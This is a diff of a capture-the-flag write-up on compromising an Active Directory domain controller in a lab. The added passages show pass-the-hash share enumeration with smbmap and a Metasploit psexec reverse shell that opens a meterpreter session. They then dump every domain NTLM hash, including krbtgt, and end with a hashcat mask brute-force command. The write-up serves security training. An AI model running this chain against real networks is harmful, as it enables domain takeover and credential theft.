@@ -890,23 +890,153 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 ```
 
-Domain controller commonly have these ports. I found 2 tools that I can use for getting the shell, `smbexec` and `psexec`. I used `psexec` because Metasploit has a module of it. So, I can easily spawn meterpreter from it. I also have the NTLM hash for one of the domain admin, `umar`. Firstly, I need to check what share folder that domain admin `umar` can access.
+Firstly, I need to check what shared folder that domain admin `umar` can access.
 
 ```
+smbmap -d MYCOMS -u umar -p aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f -H 192.168.240.30
+[+] Finding open SMB ports....
+[+] Hash detected, using pass-the-hash to authenticate
+[+] User session established on 192.168.240.30...
+[+] IP: 192.168.240.30:445	Name: 192.168.240.30                                    
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	READ, WRITE	Remote Admin
+	C$                                                	READ, WRITE	Default share
+	.                                                  
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	InitShutdown
+	fr--r--r--                4 Mon Jan  1 06:46:46 1601	lsass
+	fr--r--r--                4 Mon Jan  1 06:46:46 1601	ntsvcs
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	scerpc
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-288-0
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	epmapper
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-178-0
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	LSM_API_service
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	eventlog
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-324-0
+	fr--r--r--                2 Mon Jan  1 06:46:46 1601	atsvc
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-340-0
+	fr--r--r--                4 Mon Jan  1 06:46:46 1601	wkssvc
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-1d8-0
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-1d8-1
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	RpcProxy\49158
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	2f44a4bc206305e0
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	RpcProxy\593
+	fr--r--r--                4 Mon Jan  1 06:46:46 1601	srvsvc
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	spoolss
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-4a4-0
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	W32TIME_ALT
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	netdfs
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-1d0-0
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-508-0
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-7c4-0
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	TermSrv_API_service
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	Ctx_WinStation_API_service
+	fr--r--r--                3 Mon Jan  1 06:46:46 1601	SessEnvPublicRpc
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-7ac-0
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	Winsock2\CatalogChangeListener-b84-0
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	UIA_PIPE_4388_000077b1
+	fr--r--r--                4 Mon Jan  1 06:46:46 1601	RemCom_communicaton
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdoutPrld1653
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stderrPrld1653
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdinPrld1653
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdoutPRAY2032
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stderrPRAY2032
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdinPRAY2032
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdoutqrNz2040
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stderrqrNz2040
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdinqrNz2040
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdoutDBtQ2053
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stderrDBtQ2053
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdinDBtQ2053
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdoutKYZC6264
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stderrKYZC6264
+	fr--r--r--                1 Mon Jan  1 06:46:46 1601	RemCom_stdinKYZC6264
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ, WRITE	Logon server share 
+	SYSVOL                                            	READ, WRITE	Logon server share
+```
+
+Domain user `umar` can read and write all the shared folder. I found 2 tools that I can use for getting the shell, `smbexec` and `psexec`. I used `psexec` because Metasploit has a module of it. So, I can easily spawn meterpreter from it.
 
 ```
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.240.30
+RHOSTS => 192.168.240.30
+msf6 exploit(windows/smb/psexec) > set SERVICE_NAME test2
+SERVICE_NAME => test2
+msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
+SHARE => ADMIN$
+msf6 exploit(windows/smb/psexec) > set SMBDomain MYCOMS
+SMBDomain => MYCOMS
+msf6 exploit(windows/smb/psexec) > set SMBUser umar
+SMBUser => umar
+msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f
+SMBPass => aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f
+msf6 exploit(windows/smb/psexec) > set LHOST 10.0.200.2
+LHOST => 10.0.200.2
+msf6 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 10.0.200.2:4444 
+[*] 192.168.240.30:445 - Connecting to the server...
+[*] 192.168.240.30:445 - Authenticating to 192.168.240.30:445|MYCOMS as user 'umar'...
+[*] Sending stage (175174 bytes) to 192.168.240.80
+[*] 192.168.240.30:445 - Selecting PowerShell target
+[*] 192.168.240.30:445 - Executing the payload...
+[+] 192.168.240.30:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 192.168.240.30
+[*] Meterpreter session 1 opened (10.0.200.2:4444 -> 192.168.240.30:50027) at 2020-12-02 22:11:16 +0800
+
+meterpreter > 
+```
+
+`meterpereter` is running. Like previous challenge, I used `smart_hashdump` to dump all NTLM hashes.
+
+```
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/psexec) > use post/windows/gather/smart_hashdump
+msf6 post(windows/gather/smart_hashdump) > set session 1
+session => 1
+msf6 post(windows/gather/smart_hashdump) > run
+
+[*] Running module against PROD-AD3211
+[*] Hashes will be saved to the database if one is connected.
+[+] Hashes will be saved in loot in JtR password file format to:
+[*] /home/ahmad/.msf4/loot/20201202221603_default_192.168.240.30_windows.hashes_731527.txt
+[+] 	This host is a Domain Controller!
+[*] Dumping password hashes...
+[-] Failed to dump hashes as SYSTEM, trying to migrate to another process
+[*] Migrating to process owned by SYSTEM
+[*] Migrating to wininit.exe
+[+] Successfully migrated to wininit.exe
+[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:85206c6cdb1b01032a0086df2b569dbc
+[+] 	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a7983a9531b6654f34829fdc3a7ca08b
+[+] 	abu:1104:aad3b435b51404eeaad3b435b51404ee:7670e8dd99bbdc594089db1c33844092
+[+] 	ali:1105:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7
+[+] 	umar:1106:aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f
+[+] 	PROD-AD3211$:1001:aad3b435b51404eeaad3b435b51404ee:5b9bbee8e15db97a4a003286d96230e0
+[+] 	PROD-FSRV5633$:1107:aad3b435b51404eeaad3b435b51404ee:ed83d2d292bea5eb479cf9e132337101
+[+] 	PROD-WEBSRV7765$:1108:aad3b435b51404eeaad3b435b51404ee:eddb95449e4807dedc0d2ecdbe361719
+[*] Post module execution completed
+```
+
+Now I have all the NTLM hashes. Submit the answer.
+
+**Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:85206c6cdb1b01032a0086df2b569dbc:::**
 
 ### Q2 - NTLM hash result for Enterprise admin user
 
 ![](/images/ctf-round-3-active-directory/21.png)
 
+Grab the NTLM hashes for `abu` because `abu` is the enterprise domain admin.
 
+**Answer: abu:1104:aad3b435b51404eeaad3b435b51404ee:7670e8dd99bbdc594089db1c33844092:::**
 
 ### Q3 - Bonus - Plain text password for Domain admin user
 
 ![](/images/ctf-round-3-active-directory/22.png)
 
-Grab that NTLM hash for domain admin user `abu` into hashcat. I used Google Colab to bruteforce the plaintext password. I also modified the hint so that the time required for brute forcing became lesser.
+Grab that NTLM hash for domain admin user `abu` into hashcat. I used `Google Colab` to bruteforce the plaintext password. I also modified the hint so that the time required for brute forcing became lesser. Before using `Google Colab`, I tried with my laptop's GPU but it takes so long, estimated a year to finish. 
 
 ```
 $ hashcat -m 1000 -a 3 7670e8dd99bbdc594089db1c33844092 '?u?a?a?a?a?a?aP@ssw0rd123!'
